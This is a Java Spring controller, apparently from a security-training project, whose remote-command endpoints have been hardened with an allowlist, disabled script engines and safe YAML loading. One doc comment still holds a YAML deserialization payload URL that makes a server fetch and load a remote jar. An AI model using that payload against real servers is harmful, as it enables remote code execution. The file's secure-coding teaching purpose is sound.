package org.joychou.controller;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    // Allowlist of commands permitted for execution
    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "whoami", "hostname", "date", "uptime", "id", "uname"
    ));

    private static boolean isAllowedCommand(String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) {
            return false;
        }
        return ALLOWED_COMMANDS.contains(cmd.trim());
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (!isAllowedCommand(cmd)) {
            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use ProcessBuilder with explicit argv (no shell) to prevent injection
            ProcessBuilder pb = new ProcessBuilder(cmd.trim());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        if (!isAllowedCommand(cmd)) {
            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use argv array without shell to prevent command injection
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * JS engine endpoint is disabled to prevent remote code execution.
     * Loading arbitrary remote JS scripts allows attackers to execute arbitrary Java code.
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) {
        // Disabled: loading arbitrary remote JS via ScriptEngine enables RCE
        return "This endpoint is disabled for security reasons.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * Groovy shell endpoint is disabled to prevent remote code execution.
     * Evaluating arbitrary Groovy scripts allows attackers to run arbitrary code.
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        // Disabled: evaluating attacker-controlled Groovy enables RCE
        return "This endpoint is disabled for security reasons.";
    }



    public static void main(String[] args) throws Exception{
        // Use ProcessBuilder with argv array instead of Runtime.exec with string
        new ProcessBuilder("touch", "/tmp/x").start();
    }
}

